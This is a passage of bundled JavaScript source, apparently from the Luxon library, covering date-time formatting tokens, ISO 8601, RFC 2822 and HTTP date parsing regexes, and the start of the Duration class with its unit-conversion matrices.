  const offMin = parseInt(offMinuteStr, 10) || 0, offMinSigned = offHour < 0 || Object.is(offHour, -0) ? -offMin : offMin;
  return offHour * 60 + offMinSigned;
}
function asNumber(value) {
  const numericValue = Number(value);
  if (typeof value === "boolean" || value === "" || Number.isNaN(numericValue))
    throw new InvalidArgumentError(`Invalid unit value ${value}`);
  return numericValue;
}
function normalizeObject(obj, normalizer) {
  const normalized = {};
  for (const u in obj) {
    if (hasOwnProperty(obj, u)) {
      const v = obj[u];
      if (v === void 0 || v === null) continue;
      normalized[normalizer(u)] = asNumber(v);
    }
  }
  return normalized;
}
function formatOffset(offset2, format) {
  const hours = Math.trunc(Math.abs(offset2 / 60)), minutes = Math.trunc(Math.abs(offset2 % 60)), sign = offset2 >= 0 ? "+" : "-";
  switch (format) {
    case "short":
      return `${sign}${padStart(hours, 2)}:${padStart(minutes, 2)}`;
    case "narrow":
      return `${sign}${hours}${minutes > 0 ? `:${minutes}` : ""}`;
    case "techie":
      return `${sign}${padStart(hours, 2)}${padStart(minutes, 2)}`;
    default:
      throw new RangeError(`Value format ${format} is out of range for property format`);
  }
}
function timeObject(obj) {
  return pick(obj, ["hour", "minute", "second", "millisecond"]);
}
const monthsLong = [
  "January",
  "February",
  "March",
  "April",
  "May",
  "June",
  "July",
  "August",
  "September",
  "October",
  "November",
  "December"
];
const monthsShort = [
  "Jan",
  "Feb",
  "Mar",
  "Apr",
  "May",
  "Jun",
  "Jul",
  "Aug",
  "Sep",
  "Oct",
  "Nov",
  "Dec"
];
const monthsNarrow = ["J", "F", "M", "A", "M", "J", "J", "A", "S", "O", "N", "D"];
function months(length) {
  switch (length) {
    case "narrow":
      return [...monthsNarrow];
    case "short":
      return [...monthsShort];
    case "long":
      return [...monthsLong];
    case "numeric":
      return ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12"];
    case "2-digit":
      return ["01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12"];
    default:
      return null;
  }
}
const weekdaysLong = [
  "Monday",
  "Tuesday",
  "Wednesday",
  "Thursday",
  "Friday",
  "Saturday",
  "Sunday"
];
const weekdaysShort = ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"];
const weekdaysNarrow = ["M", "T", "W", "T", "F", "S", "S"];
function weekdays(length) {
  switch (length) {
    case "narrow":
      return [...weekdaysNarrow];
    case "short":
      return [...weekdaysShort];
    case "long":
      return [...weekdaysLong];
    case "numeric":
      return ["1", "2", "3", "4", "5", "6", "7"];
    default:
      return null;
  }
}
const meridiems = ["AM", "PM"];
const erasLong = ["Before Christ", "Anno Domini"];
const erasShort = ["BC", "AD"];
const erasNarrow = ["B", "A"];
function eras(length) {
  switch (length) {
    case "narrow":
      return [...erasNarrow];
    case "short":
      return [...erasShort];
    case "long":
      return [...erasLong];
    default:
      return null;
  }
}
function meridiemForDateTime(dt) {
  return meridiems[dt.hour < 12 ? 0 : 1];
}
function weekdayForDateTime(dt, length) {
  return weekdays(length)[dt.weekday - 1];
}
function monthForDateTime(dt, length) {
  return months(length)[dt.month - 1];
}
function eraForDateTime(dt, length) {
  return eras(length)[dt.year < 0 ? 0 : 1];
}
function formatRelativeTime(unit, count, numeric = "always", narrow = false) {
  const units = {
    years: ["year", "yr."],
    quarters: ["quarter", "qtr."],
    months: ["month", "mo."],
    weeks: ["week", "wk."],
    days: ["day", "day", "days"],
    hours: ["hour", "hr."],
    minutes: ["minute", "min."],
    seconds: ["second", "sec."]
  };
  const lastable = ["hours", "minutes", "seconds"].indexOf(unit) === -1;
  if (numeric === "auto" && lastable) {
    const isDay = unit === "days";
    switch (count) {
      case 1:
        return isDay ? "tomorrow" : `next ${units[unit][0]}`;
      case -1:
        return isDay ? "yesterday" : `last ${units[unit][0]}`;
      case 0:
        return isDay ? "today" : `this ${units[unit][0]}`;
    }
  }
  const isInPast = Object.is(count, -0) || count < 0, fmtValue = Math.abs(count), singular = fmtValue === 1, lilUnits = units[unit], fmtUnit = narrow ? singular ? lilUnits[1] : lilUnits[2] || lilUnits[1] : singular ? units[unit][0] : unit;
  return isInPast ? `${fmtValue} ${fmtUnit} ago` : `in ${fmtValue} ${fmtUnit}`;
}
function stringifyTokens(splits, tokenToString) {
  let s2 = "";
  for (const token of splits) {
    if (token.literal) {
      s2 += token.val;
    } else {
      s2 += tokenToString(token.val);
    }
  }
  return s2;
}
const macroTokenToFormatOpts = {
  D: DATE_SHORT,
  DD: DATE_MED,
  DDD: DATE_FULL,
  DDDD: DATE_HUGE,
  t: TIME_SIMPLE,
  tt: TIME_WITH_SECONDS,
  ttt: TIME_WITH_SHORT_OFFSET,
  tttt: TIME_WITH_LONG_OFFSET,
  T: TIME_24_SIMPLE,
  TT: TIME_24_WITH_SECONDS,
  TTT: TIME_24_WITH_SHORT_OFFSET,
  TTTT: TIME_24_WITH_LONG_OFFSET,
  f: DATETIME_SHORT,
  ff: DATETIME_MED,
  fff: DATETIME_FULL,
  ffff: DATETIME_HUGE,
  F: DATETIME_SHORT_WITH_SECONDS,
  FF: DATETIME_MED_WITH_SECONDS,
  FFF: DATETIME_FULL_WITH_SECONDS,
  FFFF: DATETIME_HUGE_WITH_SECONDS
};
class Formatter {
  static create(locale, opts = {}) {
    return new Formatter(locale, opts);
  }
  static parseFormat(fmt) {
    let current = null, currentFull = "", bracketed = false;
    const splits = [];
    for (let i2 = 0; i2 < fmt.length; i2++) {
      const c = fmt.charAt(i2);
      if (c === "'") {
        if (currentFull.length > 0) {
          splits.push({ literal: bracketed || /^\s+$/.test(currentFull), val: currentFull });
        }
        current = null;
        currentFull = "";
        bracketed = !bracketed;
      } else if (bracketed) {
        currentFull += c;
      } else if (c === current) {
        currentFull += c;
      } else {
        if (currentFull.length > 0) {
          splits.push({ literal: /^\s+$/.test(currentFull), val: currentFull });
        }
        currentFull = c;
        current = c;
      }
    }
    if (currentFull.length > 0) {
      splits.push({ literal: bracketed || /^\s+$/.test(currentFull), val: currentFull });
    }
    return splits;
  }
  static macroTokenToFormatOpts(token) {
    return macroTokenToFormatOpts[token];
  }
  constructor(locale, formatOpts) {
    this.opts = formatOpts;
    this.loc = locale;
    this.systemLoc = null;
  }
  formatWithSystemDefault(dt, opts) {
    if (this.systemLoc === null) {
      this.systemLoc = this.loc.redefaultToSystem();
    }
    const df = this.systemLoc.dtFormatter(dt, { ...this.opts, ...opts });
    return df.format();
  }
  dtFormatter(dt, opts = {}) {
    return this.loc.dtFormatter(dt, { ...this.opts, ...opts });
  }
  formatDateTime(dt, opts) {
    return this.dtFormatter(dt, opts).format();
  }
  formatDateTimeParts(dt, opts) {
    return this.dtFormatter(dt, opts).formatToParts();
  }
  formatInterval(interval, opts) {
    const df = this.dtFormatter(interval.start, opts);
    return df.dtf.formatRange(interval.start.toJSDate(), interval.end.toJSDate());
  }
  resolvedOptions(dt, opts) {
    return this.dtFormatter(dt, opts).resolvedOptions();
  }
  num(n2, p = 0) {
    if (this.opts.forceSimple) {
      return padStart(n2, p);
    }
    const opts = { ...this.opts };
    if (p > 0) {
      opts.padTo = p;
    }
    return this.loc.numberFormatter(opts).format(n2);
  }
  formatDateTimeFromString(dt, fmt) {
    const knownEnglish = this.loc.listingMode() === "en", useDateTimeFormatter = this.loc.outputCalendar && this.loc.outputCalendar !== "gregory", string2 = (opts, extract) => this.loc.extract(dt, opts, extract), formatOffset2 = (opts) => {
      if (dt.isOffsetFixed && dt.offset === 0 && opts.allowZ) {
        return "Z";
      }
      return dt.isValid ? dt.zone.formatOffset(dt.ts, opts.format) : "";
    }, meridiem = () => knownEnglish ? meridiemForDateTime(dt) : string2({ hour: "numeric", hourCycle: "h12" }, "dayperiod"), month = (length, standalone) => knownEnglish ? monthForDateTime(dt, length) : string2(standalone ? { month: length } : { month: length, day: "numeric" }, "month"), weekday = (length, standalone) => knownEnglish ? weekdayForDateTime(dt, length) : string2(
      standalone ? { weekday: length } : { weekday: length, month: "long", day: "numeric" },
      "weekday"
    ), maybeMacro = (token) => {
      const formatOpts = Formatter.macroTokenToFormatOpts(token);
      if (formatOpts) {
        return this.formatWithSystemDefault(dt, formatOpts);
      } else {
        return token;
      }
    }, era = (length) => knownEnglish ? eraForDateTime(dt, length) : string2({ era: length }, "era"), tokenToString = (token) => {
      switch (token) {
        case "S":
          return this.num(dt.millisecond);
        case "u":
        case "SSS":
          return this.num(dt.millisecond, 3);
        case "s":
          return this.num(dt.second);
        case "ss":
          return this.num(dt.second, 2);
        case "uu":
          return this.num(Math.floor(dt.millisecond / 10), 2);
        case "uuu":
          return this.num(Math.floor(dt.millisecond / 100));
        case "m":
          return this.num(dt.minute);
        case "mm":
          return this.num(dt.minute, 2);
        case "h":
          return this.num(dt.hour % 12 === 0 ? 12 : dt.hour % 12);
        case "hh":
          return this.num(dt.hour % 12 === 0 ? 12 : dt.hour % 12, 2);
        case "H":
          return this.num(dt.hour);
        case "HH":
          return this.num(dt.hour, 2);
        case "Z":
          return formatOffset2({ format: "narrow", allowZ: this.opts.allowZ });
        case "ZZ":
          return formatOffset2({ format: "short", allowZ: this.opts.allowZ });
        case "ZZZ":
          return formatOffset2({ format: "techie", allowZ: this.opts.allowZ });
        case "ZZZZ":
          return dt.zone.offsetName(dt.ts, { format: "short", locale: this.loc.locale });
        case "ZZZZZ":
          return dt.zone.offsetName(dt.ts, { format: "long", locale: this.loc.locale });
        case "z":
          return dt.zoneName;
        case "a":
          return meridiem();
        case "d":
          return useDateTimeFormatter ? string2({ day: "numeric" }, "day") : this.num(dt.day);
        case "dd":
          return useDateTimeFormatter ? string2({ day: "2-digit" }, "day") : this.num(dt.day, 2);
        case "c":
          return this.num(dt.weekday);
        case "ccc":
          return weekday("short", true);
        case "cccc":
          return weekday("long", true);
        case "ccccc":
          return weekday("narrow", true);
        case "E":
          return this.num(dt.weekday);
        case "EEE":
          return weekday("short", false);
        case "EEEE":
          return weekday("long", false);
        case "EEEEE":
          return weekday("narrow", false);
        case "L":
          return useDateTimeFormatter ? string2({ month: "numeric", day: "numeric" }, "month") : this.num(dt.month);
        case "LL":
          return useDateTimeFormatter ? string2({ month: "2-digit", day: "numeric" }, "month") : this.num(dt.month, 2);
        case "LLL":
          return month("short", true);
        case "LLLL":
          return month("long", true);
        case "LLLLL":
          return month("narrow", true);
        case "M":
          return useDateTimeFormatter ? string2({ month: "numeric" }, "month") : this.num(dt.month);
        case "MM":
          return useDateTimeFormatter ? string2({ month: "2-digit" }, "month") : this.num(dt.month, 2);
        case "MMM":
          return month("short", false);
        case "MMMM":
          return month("long", false);
        case "MMMMM":
          return month("narrow", false);
        case "y":
          return useDateTimeFormatter ? string2({ year: "numeric" }, "year") : this.num(dt.year);
        case "yy":
          return useDateTimeFormatter ? string2({ year: "2-digit" }, "year") : this.num(dt.year.toString().slice(-2), 2);
        case "yyyy":
          return useDateTimeFormatter ? string2({ year: "numeric" }, "year") : this.num(dt.year, 4);
        case "yyyyyy":
          return useDateTimeFormatter ? string2({ year: "numeric" }, "year") : this.num(dt.year, 6);
        case "G":
          return era("short");
        case "GG":
          return era("long");
        case "GGGGG":
          return era("narrow");
        case "kk":
          return this.num(dt.weekYear.toString().slice(-2), 2);
        case "kkkk":
          return this.num(dt.weekYear, 4);
        case "W":
          return this.num(dt.weekNumber);
        case "WW":
          return this.num(dt.weekNumber, 2);
        case "n":
          return this.num(dt.localWeekNumber);
        case "nn":
          return this.num(dt.localWeekNumber, 2);
        case "ii":
          return this.num(dt.localWeekYear.toString().slice(-2), 2);
        case "iiii":
          return this.num(dt.localWeekYear, 4);
        case "o":
          return this.num(dt.ordinal);
        case "ooo":
          return this.num(dt.ordinal, 3);
        case "q":
          return this.num(dt.quarter);
        case "qq":
          return this.num(dt.quarter, 2);
        case "X":
          return this.num(Math.floor(dt.ts / 1e3));
        case "x":
          return this.num(dt.ts);
        default:
          return maybeMacro(token);
      }
    };
    return stringifyTokens(Formatter.parseFormat(fmt), tokenToString);
  }
  formatDurationFromString(dur, fmt) {
    const tokenToField = (token) => {
      switch (token[0]) {
        case "S":
          return "millisecond";
        case "s":
          return "second";
        case "m":
          return "minute";
        case "h":
          return "hour";
        case "d":
          return "day";
        case "w":
          return "week";
        case "M":
          return "month";
        case "y":
          return "year";
        default:
          return null;
      }
    }, tokenToString = (lildur) => (token) => {
      const mapped = tokenToField(token);
      if (mapped) {
        return this.num(lildur.get(mapped), token.length);
      } else {
        return token;
      }
    }, tokens = Formatter.parseFormat(fmt), realTokens = tokens.reduce(
      (found, { literal, val }) => literal ? found : found.concat(val),
      []
    ), collapsed = dur.shiftTo(...realTokens.map(tokenToField).filter((t) => t));
    return stringifyTokens(tokens, tokenToString(collapsed));
  }
}
const ianaRegex = /[A-Za-z_+-]{1,256}(?::?\/[A-Za-z0-9_+-]{1,256}(?:\/[A-Za-z0-9_+-]{1,256})?)?/;
function combineRegexes(...regexes) {
  const full = regexes.reduce((f, r) => f + r.source, "");
  return RegExp(`^${full}$`);
}
function combineExtractors(...extractors) {
  return (m3) => extractors.reduce(
    ([mergedVals, mergedZone, cursor], ex) => {
      const [val, zone, next] = ex(m3, cursor);
      return [{ ...mergedVals, ...val }, zone || mergedZone, next];
    },
    [{}, null, 1]
  ).slice(0, 2);
}
function parse$2(s2, ...patterns) {
  if (s2 == null) {
    return [null, null];
  }
  for (const [regex, extractor] of patterns) {
    const m3 = regex.exec(s2);
    if (m3) {
      return extractor(m3);
    }
  }
  return [null, null];
}
function simpleParse(...keys) {
  return (match2, cursor) => {
    const ret = {};
    let i2;
    for (i2 = 0; i2 < keys.length; i2++) {
      ret[keys[i2]] = parseInteger(match2[cursor + i2]);
    }
    return [ret, null, cursor + i2];
  };
}
const offsetRegex = /(?:(Z)|([+-]\d\d)(?::?(\d\d))?)/;
const isoExtendedZone = `(?:${offsetRegex.source}?(?:\\[(${ianaRegex.source})\\])?)?`;
const isoTimeBaseRegex = /(\d\d)(?::?(\d\d)(?::?(\d\d)(?:[.,](\d{1,30}))?)?)?/;
const isoTimeRegex = RegExp(`${isoTimeBaseRegex.source}${isoExtendedZone}`);
const isoTimeExtensionRegex = RegExp(`(?:T${isoTimeRegex.source})?`);
const isoYmdRegex = /([+-]\d{6}|\d{4})(?:-?(\d\d)(?:-?(\d\d))?)?/;
const isoWeekRegex = /(\d{4})-?W(\d\d)(?:-?(\d))?/;
const isoOrdinalRegex = /(\d{4})-?(\d{3})/;
const extractISOWeekData = simpleParse("weekYear", "weekNumber", "weekDay");
const extractISOOrdinalData = simpleParse("year", "ordinal");
const sqlYmdRegex = /(\d{4})-(\d\d)-(\d\d)/;
const sqlTimeRegex = RegExp(
  `${isoTimeBaseRegex.source} ?(?:${offsetRegex.source}|(${ianaRegex.source}))?`
);
const sqlTimeExtensionRegex = RegExp(`(?: ${sqlTimeRegex.source})?`);
function int(match2, pos, fallback) {
  const m3 = match2[pos];
  return isUndefined(m3) ? fallback : parseInteger(m3);
}
function extractISOYmd(match2, cursor) {
  const item = {
    year: int(match2, cursor),
    month: int(match2, cursor + 1, 1),
    day: int(match2, cursor + 2, 1)
  };
  return [item, null, cursor + 3];
}
function extractISOTime(match2, cursor) {
  const item = {
    hours: int(match2, cursor, 0),
    minutes: int(match2, cursor + 1, 0),
    seconds: int(match2, cursor + 2, 0),
    milliseconds: parseMillis(match2[cursor + 3])
  };
  return [item, null, cursor + 4];
}
function extractISOOffset(match2, cursor) {
  const local = !match2[cursor] && !match2[cursor + 1], fullOffset = signedOffset(match2[cursor + 1], match2[cursor + 2]), zone = local ? null : FixedOffsetZone.instance(fullOffset);
  return [{}, zone, cursor + 3];
}
function extractIANAZone(match2, cursor) {
  const zone = match2[cursor] ? IANAZone.create(match2[cursor]) : null;
  return [{}, zone, cursor + 1];
}
const isoTimeOnly = RegExp(`^T?${isoTimeBaseRegex.source}$`);
const isoDuration = /^-?P(?:(?:(-?\d{1,20}(?:\.\d{1,20})?)Y)?(?:(-?\d{1,20}(?:\.\d{1,20})?)M)?(?:(-?\d{1,20}(?:\.\d{1,20})?)W)?(?:(-?\d{1,20}(?:\.\d{1,20})?)D)?(?:T(?:(-?\d{1,20}(?:\.\d{1,20})?)H)?(?:(-?\d{1,20}(?:\.\d{1,20})?)M)?(?:(-?\d{1,20})(?:[.,](-?\d{1,20}))?S)?)?)$/;
function extractISODuration(match2) {
  const [s2, yearStr, monthStr, weekStr, dayStr, hourStr, minuteStr, secondStr, millisecondsStr] = match2;
  const hasNegativePrefix = s2[0] === "-";
  const negativeSeconds = secondStr && secondStr[0] === "-";
  const maybeNegate = (num, force = false) => num !== void 0 && (force || num && hasNegativePrefix) ? -num : num;
  return [
    {
      years: maybeNegate(parseFloating(yearStr)),
      months: maybeNegate(parseFloating(monthStr)),
      weeks: maybeNegate(parseFloating(weekStr)),
      days: maybeNegate(parseFloating(dayStr)),
      hours: maybeNegate(parseFloating(hourStr)),
      minutes: maybeNegate(parseFloating(minuteStr)),
      seconds: maybeNegate(parseFloating(secondStr), secondStr === "-0"),
      milliseconds: maybeNegate(parseMillis(millisecondsStr), negativeSeconds)
    }
  ];
}
const obsOffsets = {
  GMT: 0,
  EDT: -4 * 60,
  EST: -5 * 60,
  CDT: -5 * 60,
  CST: -6 * 60,
  MDT: -6 * 60,
  MST: -7 * 60,
  PDT: -7 * 60,
  PST: -8 * 60
};
function fromStrings(weekdayStr, yearStr, monthStr, dayStr, hourStr, minuteStr, secondStr) {
  const result = {
    year: yearStr.length === 2 ? untruncateYear(parseInteger(yearStr)) : parseInteger(yearStr),
    month: monthsShort.indexOf(monthStr) + 1,
    day: parseInteger(dayStr),
    hour: parseInteger(hourStr),
    minute: parseInteger(minuteStr)
  };
  if (secondStr) result.second = parseInteger(secondStr);
  if (weekdayStr) {
    result.weekday = weekdayStr.length > 3 ? weekdaysLong.indexOf(weekdayStr) + 1 : weekdaysShort.indexOf(weekdayStr) + 1;
  }
  return result;
}
const rfc2822 = /^(?:(Mon|Tue|Wed|Thu|Fri|Sat|Sun),\s)?(\d{1,2})\s(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s(\d{2,4})\s(\d\d):(\d\d)(?::(\d\d))?\s(?:(UT|GMT|[ECMP][SD]T)|([Zz])|(?:([+-]\d\d)(\d\d)))$/;
function extractRFC2822(match2) {
  const [
    ,
    weekdayStr,
    dayStr,
    monthStr,
    yearStr,
    hourStr,
    minuteStr,
    secondStr,
    obsOffset,
    milOffset,
    offHourStr,
    offMinuteStr
  ] = match2, result = fromStrings(weekdayStr, yearStr, monthStr, dayStr, hourStr, minuteStr, secondStr);
  let offset2;
  if (obsOffset) {
    offset2 = obsOffsets[obsOffset];
  } else if (milOffset) {
    offset2 = 0;
  } else {
    offset2 = signedOffset(offHourStr, offMinuteStr);
  }
  return [result, new FixedOffsetZone(offset2)];
}
function preprocessRFC2822(s2) {
  return s2.replace(/\([^()]*\)|[\n\t]/g, " ").replace(/(\s\s+)/g, " ").trim();
}
const rfc1123 = /^(Mon|Tue|Wed|Thu|Fri|Sat|Sun), (\d\d) (Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec) (\d{4}) (\d\d):(\d\d):(\d\d) GMT$/, rfc850 = /^(Monday|Tuesday|Wednesday|Thursday|Friday|Saturday|Sunday), (\d\d)-(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)-(\d\d) (\d\d):(\d\d):(\d\d) GMT$/, ascii = /^(Mon|Tue|Wed|Thu|Fri|Sat|Sun) (Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec) ( \d|\d\d) (\d\d):(\d\d):(\d\d) (\d{4})$/;
function extractRFC1123Or850(match2) {
  const [, weekdayStr, dayStr, monthStr, yearStr, hourStr, minuteStr, secondStr] = match2, result = fromStrings(weekdayStr, yearStr, monthStr, dayStr, hourStr, minuteStr, secondStr);
  return [result, FixedOffsetZone.utcInstance];
}
function extractASCII(match2) {
  const [, weekdayStr, monthStr, dayStr, hourStr, minuteStr, secondStr, yearStr] = match2, result = fromStrings(weekdayStr, yearStr, monthStr, dayStr, hourStr, minuteStr, secondStr);
  return [result, FixedOffsetZone.utcInstance];
}
const isoYmdWithTimeExtensionRegex = combineRegexes(isoYmdRegex, isoTimeExtensionRegex);
const isoWeekWithTimeExtensionRegex = combineRegexes(isoWeekRegex, isoTimeExtensionRegex);
const isoOrdinalWithTimeExtensionRegex = combineRegexes(isoOrdinalRegex, isoTimeExtensionRegex);
const isoTimeCombinedRegex = combineRegexes(isoTimeRegex);
const extractISOYmdTimeAndOffset = combineExtractors(
  extractISOYmd,
  extractISOTime,
  extractISOOffset,
  extractIANAZone
);
const extractISOWeekTimeAndOffset = combineExtractors(
  extractISOWeekData,
  extractISOTime,
  extractISOOffset,
  extractIANAZone
);
const extractISOOrdinalDateAndTime = combineExtractors(
  extractISOOrdinalData,
  extractISOTime,
  extractISOOffset,
  extractIANAZone
);
const extractISOTimeAndOffset = combineExtractors(
  extractISOTime,
  extractISOOffset,
  extractIANAZone
);
function parseISODate(s2) {
  return parse$2(
    s2,
    [isoYmdWithTimeExtensionRegex, extractISOYmdTimeAndOffset],
    [isoWeekWithTimeExtensionRegex, extractISOWeekTimeAndOffset],
    [isoOrdinalWithTimeExtensionRegex, extractISOOrdinalDateAndTime],
    [isoTimeCombinedRegex, extractISOTimeAndOffset]
  );
}
function parseRFC2822Date(s2) {
  return parse$2(preprocessRFC2822(s2), [rfc2822, extractRFC2822]);
}
function parseHTTPDate(s2) {
  return parse$2(
    s2,
    [rfc1123, extractRFC1123Or850],
    [rfc850, extractRFC1123Or850],
    [ascii, extractASCII]
  );
}
function parseISODuration(s2) {
  return parse$2(s2, [isoDuration, extractISODuration]);
}
const extractISOTimeOnly = combineExtractors(extractISOTime);
function parseISOTimeOnly(s2) {
  return parse$2(s2, [isoTimeOnly, extractISOTimeOnly]);
}
const sqlYmdWithTimeExtensionRegex = combineRegexes(sqlYmdRegex, sqlTimeExtensionRegex);
const sqlTimeCombinedRegex = combineRegexes(sqlTimeRegex);
const extractISOTimeOffsetAndIANAZone = combineExtractors(
  extractISOTime,
  extractISOOffset,
  extractIANAZone
);
function parseSQL(s2) {
  return parse$2(
    s2,
    [sqlYmdWithTimeExtensionRegex, extractISOYmdTimeAndOffset],
    [sqlTimeCombinedRegex, extractISOTimeOffsetAndIANAZone]
  );
}
const INVALID$2 = "Invalid Duration";
const lowOrderMatrix = {
  weeks: {
    days: 7,
    hours: 7 * 24,
    minutes: 7 * 24 * 60,
    seconds: 7 * 24 * 60 * 60,
    milliseconds: 7 * 24 * 60 * 60 * 1e3
  },
  days: {
    hours: 24,
    minutes: 24 * 60,
    seconds: 24 * 60 * 60,
    milliseconds: 24 * 60 * 60 * 1e3
  },
  hours: { minutes: 60, seconds: 60 * 60, milliseconds: 60 * 60 * 1e3 },
  minutes: { seconds: 60, milliseconds: 60 * 1e3 },
  seconds: { milliseconds: 1e3 }
}, casualMatrix = {
  years: {
    quarters: 4,
    months: 12,
    weeks: 52,
    days: 365,
    hours: 365 * 24,
    minutes: 365 * 24 * 60,
    seconds: 365 * 24 * 60 * 60,
    milliseconds: 365 * 24 * 60 * 60 * 1e3
  },
  quarters: {
    months: 3,
    weeks: 13,
    days: 91,
    hours: 91 * 24,
    minutes: 91 * 24 * 60,
    seconds: 91 * 24 * 60 * 60,
    milliseconds: 91 * 24 * 60 * 60 * 1e3
  },
  months: {
    weeks: 4,
    days: 30,
    hours: 30 * 24,
    minutes: 30 * 24 * 60,
    seconds: 30 * 24 * 60 * 60,
    milliseconds: 30 * 24 * 60 * 60 * 1e3
  },
  ...lowOrderMatrix
}, daysInYearAccurate = 146097 / 400, daysInMonthAccurate = 146097 / 4800, accurateMatrix = {
  years: {
    quarters: 4,
    months: 12,
    weeks: daysInYearAccurate / 7,
    days: daysInYearAccurate,
    hours: daysInYearAccurate * 24,
    minutes: daysInYearAccurate * 24 * 60,
    seconds: daysInYearAccurate * 24 * 60 * 60,
    milliseconds: daysInYearAccurate * 24 * 60 * 60 * 1e3
  },
  quarters: {
    months: 3,
    weeks: daysInYearAccurate / 28,
    days: daysInYearAccurate / 4,
    hours: daysInYearAccurate * 24 / 4,
    minutes: daysInYearAccurate * 24 * 60 / 4,
    seconds: daysInYearAccurate * 24 * 60 * 60 / 4,
    milliseconds: daysInYearAccurate * 24 * 60 * 60 * 1e3 / 4
  },
  months: {
    weeks: daysInMonthAccurate / 7,
    days: daysInMonthAccurate,
    hours: daysInMonthAccurate * 24,
    minutes: daysInMonthAccurate * 24 * 60,
    seconds: daysInMonthAccurate * 24 * 60 * 60,
    milliseconds: daysInMonthAccurate * 24 * 60 * 60 * 1e3
  },
  ...lowOrderMatrix
};
const orderedUnits$1 = [
  "years",
  "quarters",
  "months",
  "weeks",
  "days",
  "hours",
  "minutes",
  "seconds",
  "milliseconds"
];
const reverseUnits = orderedUnits$1.slice(0).reverse();
function clone$1(dur, alts, clear = false) {
  const conf = {
    values: clear ? alts.values : { ...dur.values, ...alts.values || {} },
    loc: dur.loc.clone(alts.loc),
    conversionAccuracy: alts.conversionAccuracy || dur.conversionAccuracy,
    matrix: alts.matrix || dur.matrix
  };
  return new Duration(conf);
}
function durationToMillis(matrix, vals) {
  let sum = vals.milliseconds ?? 0;
  for (const unit of reverseUnits.slice(1)) {
    if (vals[unit]) {
      sum += vals[unit] * matrix[unit]["milliseconds"];
    }
  }
  return sum;
}
function normalizeValues(matrix, vals) {
  const factor = durationToMillis(matrix, vals) < 0 ? -1 : 1;
  orderedUnits$1.reduceRight((previous, current) => {
    if (!isUndefined(vals[current])) {
      if (previous) {
        const previousVal = vals[previous] * factor;
        const conv = matrix[current][previous];
        const rollUp = Math.floor(previousVal / conv);
        vals[current] += rollUp * factor;
        vals[previous] -= rollUp * conv * factor;
      }
      return current;
    } else {
      return previous;
    }
  }, null);
  orderedUnits$1.reduce((previous, current) => {
    if (!isUndefined(vals[current])) {
      if (previous) {
        const fraction = vals[previous] % 1;
        vals[previous] -= fraction;
        vals[current] += fraction * matrix[previous][current];
      }
      return current;
    } else {
      return previous;
    }
  }, null);
}
function removeZeroes(vals) {
  const newVals = {};
  for (const [key, value] of Object.entries(vals)) {
    if (value !== 0) {
      newVals[key] = value;
    }
  }
  return newVals;
}
class Duration {
  /**
   * @private
   */
  constructor(config) {
    const accurate = config.conversionAccuracy === "longterm" || false;
    let matrix = accurate ? accurateMatrix : casualMatrix;
    if (config.matrix) {
      matrix = config.matrix;
    }
    this.values = config.values;
    this.loc = config.loc || Locale.create();
    this.conversionAccuracy = accurate ? "longterm" : "casual";
    this.invalid = config.invalid || null;
    this.matrix = matrix;
    this.isLuxonDuration = true;
  }
  /**
   * Create Duration from a number of milliseconds.
   * @param {number} count of milliseconds
   * @param {Object} opts - options for parsing
   * @param {string} [opts.locale='en-US'] - the locale to use
   * @param {string} opts.numberingSystem - the numbering system to use
   * @param {string} [opts.conversionAccuracy='casual'] - the conversion system to use
   * @return {Duration}
   */
  static fromMillis(count, opts) {
    return Duration.fromObject({ milliseconds: count }, opts);
  }
  /**
   * Create a Duration from a JavaScript object with keys like 'years' and 'hours'.
   * If this object is empty then a zero milliseconds duration is returned.
   * @param {Object} obj - the object to create the DateTime from
   * @param {number} obj.years
   * @param {number} obj.quarters
   * @param {number} obj.months
   * @param {number} obj.weeks
   * @param {number} obj.days
   * @param {number} obj.hours
   * @param {number} obj.minutes
   * @param {number} obj.seconds
   * @param {number} obj.milliseconds
   * @param {Object} [opts=[]] - options for creating this Duration
   * @param {string} [opts.locale='en-US'] - the locale to use
   * @param {string} opts.numberingSystem - the numbering system to use
   * @param {string} [opts.conversionAccuracy='casual'] - the preset conversion system to use
   * @param {string} [opts.matrix=Object] - the custom conversion system to use
   * @return {Duration}
   */
  static fromObject(obj, opts = {}) {
    if (obj == null || typeof obj !== "object") {
      throw new InvalidArgumentError(
        `Duration.fromObject: argument expected to be an object, got ${obj === null ? "null" : typeof obj}`
      );
    }
    return new Duration({
      values: normalizeObject(obj, Duration.normalizeUnit),
      loc: Locale.fromObject(opts),
      conversionAccuracy: opts.conversionAccuracy,
      matrix: opts.matrix
    });
  }
  /**
   * Create a Duration from DurationLike.
   *
   * @param {Object | number | Duration} durationLike
   * One of:
   * - object with keys like 'years' and 'hours'.
   * - number representing milliseconds
   * - Duration instance
   * @return {Duration}
   */
  static fromDurationLike(durationLike) {
    if (isNumber(durationLike)) {
      return Duration.fromMillis(durationLike);
    } else if (Duration.isDuration(durationLike)) {
      return durationLike;
    } else if (typeof durationLike === "object") {
      return Duration.fromObject(durationLike);
    } else {
      throw new InvalidArgumentError(
        `Unknown duration argument ${durationLike} of type ${typeof durationLike}`
      );
    }
  }
  /**
   * Create a Duration from an ISO 8601 duration string.
   * @param {string} text - text to parse
   * @param {Object} opts - options for parsing
   * @param {string} [opts.locale='en-US'] - the locale to use
   * @param {string} opts.numberingSystem - the numbering system to use
   * @param {string} [opts.conversionAccuracy='casual'] - the preset conversion system to use
   * @param {string} [opts.matrix=Object] - the preset conversion system to use
   * @see https://en.wikipedia.org/wiki/ISO_8601#Durations
   * @example Duration.fromISO('P3Y6M1W4DT12H30M5S').toObject() //=> { years: 3, months: 6, weeks: 1, days: 4, hours: 12, minutes: 30, seconds: 5 }
   * @example Duration.fromISO('PT23H').toObject() //=> { hours: 23 }
   * @example Duration.fromISO('P5Y3M').toObject() //=> { years: 5, months: 3 }
   * @return {Duration}
   */
  static fromISO(text, opts) {
    const [parsed] = parseISODuration(text);
    if (parsed) {
      return Duration.fromObject(parsed, opts);
    } else {
      return Duration.invalid("unparsable", `the input "${text}" can't be parsed as ISO 8601`);
    }
  }
  /**
